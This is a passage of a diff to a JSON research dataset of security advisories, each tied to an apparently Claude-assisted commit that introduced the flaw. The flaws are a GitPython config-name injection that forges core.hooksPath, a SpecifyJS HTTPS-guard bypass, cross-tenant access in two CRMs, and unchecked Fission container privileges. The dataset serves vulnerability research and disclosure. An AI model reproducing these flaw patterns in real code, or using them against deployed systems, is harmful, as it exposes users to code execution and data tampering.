+     "closed": "Added the exact joined token to the candidates checked before Git runs."
+    }
    }
   },
   {
@@ -21334,9 +21359,9 @@
     "https://github.com/advisories/GHSA-gmvg-8p66-77hg"
    ],
    "description": "GitPython validated configuration values but left section and option names unchecked. The repair rejects carriage returns, newlines and NUL characters in configuration names.",
-   "mechanism": "GitPython validated configuration values but left section and option names unchecked. The repair rejects carriage returns, newlines and NUL characters in configuration names.",
+   "mechanism": "GitPython's configuration writer has never checked section or option names, so a newline in a name passed to config_writer() splits it across lines and can forge settings such as core.hooksPath; when a hook later runs, code the attacker chose executes. An AI-written hardening change added control-character checks for configuration values but left names unchecked. The repair, first released in 3.1.50, rejects carriage returns, newlines and NUL characters in names.",
    "code_evidence": {
-    "summary": "GitPython validated configuration values but left section and option names unchecked. The repair rejects carriage returns, newlines and NUL characters in configuration names.",
+    "summary": "An AI-written hardening change checked Git configuration values for control characters but not section or option names, so a newline in a name could still forge settings such as core.hooksPath.",
     "steps": [
      {
       "title": "AI-assisted change",
@@ -21600,6 +21625,115 @@
       "detail": "The parser caches the last character for each accumulation state."
      }
     ]
+   }
+  },
+  {
+   "class_id": "alias-203bff3ee3277cd64f94c6bc",
+   "case_id": "GHSA-8882-FRVV-92W4",
+   "aliases": [
+    "CVE-2026-50288",
+    "alias-203bff3ee3277cd64f94c6bc"
+   ],
+   "repository": "asymmetric-effort/specifyjs",
+   "mechanism": "SpecifyJS's secure-fetch helper was meant to refuse any URL that is not HTTPS, but it wrapped URL parsing in a catch that simply returned when parsing failed, so the protocol and host checks were skipped for such input. A Claude-assisted change wrote the helper this way, and it shipped from v0.0.7 through 0.2.135; the advisory lists 0.2.136 as fixed. The research confirmed the policy bypass but could not reproduce the request forgery the advisory describes: in the tested Node and Bun versions, fetch itself still rejected every string the parser rejected.",
+   "code_evidence": {
+    "ai_marker": "Co-Authored-By: Claude Opus 4.6 (1M context) <noreply@anthropic.com>",
+    "summary": "A Claude-assisted change wrote an HTTPS-only URL guard that silently returned when a URL failed to parse, so the protocol and host checks were skipped for such input.",
+    "candidate_url": "https://github.com/asymmetric-effort/specifyjs/commit/30f9b76f848b681e2806ac6ebcebebb055af3999",
+    "fix_url": "https://github.com/asymmetric-effort/specifyjs/commit/25d1fb491d99479efdf501f5f75e0bb80c908f0a"
+   },
+   "repository_metadata": {
+    "full_name": "asymmetric-effort/specifyjs",
+    "language": "TypeScript",
+    "archived": false
+   },
+   "vulnerable_release": {
+    "kind": "git_tag",
+    "tag": "v0.2.135",
+    "sha": null,
+    "contains_candidate_ancestor": true,
+    "contains_fix_ancestor": false
+   },
+   "fixed_release": {
+    "kind": "git_tag",
+    "tag": "v0.2.136",
+    "sha": null,
+    "contains_fix_ancestor": true
+   }
+  },
+  {
+   "class_id": "alias-23266042a88424523b7b8f48",
+   "case_id": "GHSA-X2W7-XR2G-QHJR",
+   "aliases": [
+    "CVE-2026-49141",
+    "alias-23266042a88424523b7b8f48"
+   ],
+   "repository": "arnasdon/wacrm",
+   "mechanism": "wacrm's manual automation endpoint took a contact ID from the request body and ran the account's automations against it through a service-role database client, without checking that the contact belonged to the caller's account. A signed-in user whose automations had the matching steps could change another tenant's contact fields, add or remove its tags, or attach deals to it. A Claude-assisted change introduced the endpoint and engine this way. A later change checks ownership for new runs, but a run already paused at a wait step resumes with the stored contact ID unchecked, and its custom-field, tag-removal, tag-condition and deal steps still act on that contact; no complete repair exists in the repository through October 2026.",
+   "code_evidence": {
+    "ai_marker": "Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>",
+    "summary": "A Claude-assisted change let a signed-in user run automations against any contact ID through a service-role client, so one tenant could modify another tenant's contacts; a later partial fix still leaves paused runs unchecked.",
+    "candidate_url": "https://github.com/arnasdon/wacrm/commit/b7b362ae427ccf4b33b8e8cd147f16410f3ce800",
+    "fix_url": ""
+   },
+   "repository_metadata": {
+    "full_name": "ArnasDon/wacrm",
+    "language": "TypeScript",
+    "archived": false
+   }
+  },
+  {
+   "class_id": "alias-2e848b53793009fca2ca1de3",
+   "case_id": "GHSA-M63V-2G9W-2W6V",
+   "aliases": [
+    "CVE-2026-50566",
+    "alias-2e848b53793009fca2ca1de3"
+   ],
+   "repository": "fission/fission",
+   "mechanism": "Fission merges each Environment's runtime and builder container settings into the pods its executor and builder services create. A Claude-assisted hardening change validated and sanitized the security context only in the Environment's pod specs and left the separate container fields unchecked, so a tenant allowed to create or update an Environment could still request a privileged container, privilege escalation or dangerous capabilities through those fields. The unchecked container fields themselves came from earlier human code. A Claude-assisted follow-up checks the container fields too. The hardening change and its follow-up first shipped together in the 1.24.0 prerelease, and 1.25.0 is the first stable release with both, so no release carries the incomplete hardening alone; the releases through 1.23.0 that the advisory lists have no container check at all.",
+   "code_evidence": {
+    "ai_marker": "Co-authored-by: Claude Opus 4.7 (1M context) <noreply@anthropic.com>",
+    "summary": "A Claude-assisted hardening change sanitized the security context of Fission Environment pod specs but not their separate container fields, so tenants could still request privileged containers through those fields.",
+    "candidate_url": "https://github.com/fission/fission/commit/e484df8460bb4e8026e24210120602aa7f181f64",
+    "fix_url": "https://github.com/fission/fission/commit/695d3e97e3a20463ab7c8c081843e69e65e952e5"
+   },
+   "repository_metadata": {
+    "full_name": "fission/fission",
+    "language": "Go",
+    "archived": false
+   },
+   "fixed_release": {
+    "kind": "git_tag",
+    "tag": "v1.24.0",
+    "sha": null,
+    "contains_fix_ancestor": true
+   }
+  },
+  {
+   "class_id": "alias-8ae5a01cbdd3ea4431941888",
+   "case_id": "GHSA-X8QQ-M4QC-RPJ5",
+   "aliases": [
+    "CVE-2026-59237",
+    "alias-8ae5a01cbdd3ea4431941888"
+   ],
+   "repository": "roskus/prospero-flow-crm",
+   "mechanism": "Prospero Flow CRM's new order and order-item API looked records up by ID across all companies and never checked that the record belonged to the caller's company, although the neighbouring list and delete handlers did. Any authenticated API user could read another company's order and its items, and users with order permissions could change another company's order or read, change or delete its items. A Claude-assisted change added the order read and update handlers this way, and a later change added the item handlers with the same lookup. The fix, three days later, scopes all five lookups to the caller's company. The vulnerable code was never in a tagged release: the release before it has no API and the next one already contains the fix, so the advisory's version range overstates what shipped.",
+   "code_evidence": {
+    "ai_marker": "Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>",
+    "summary": "A Claude-assisted change added order API handlers that fetched records by ID without checking the caller's company, so users of one company could read or change another company's orders.",
+    "candidate_url": "https://github.com/roskus/prospero-flow-crm/commit/56ea64c80fd36840fe3c84d0c6a6a38296a8f111",
+    "fix_url": "https://github.com/roskus/prospero-flow-crm/commit/9a859c4de3d49674916773d346c60d89ad7febe0"
+   },
+   "repository_metadata": {
+    "full_name": "Roskus/prospero-flow-crm",
+    "language": "PHP",
+    "archived": false
+   },
+   "fixed_release": {
+    "kind": "git_tag",
+    "tag": "v5.5.3",
+    "sha": null,
+    "contains_fix_ancestor": true
    }
   }
  ]
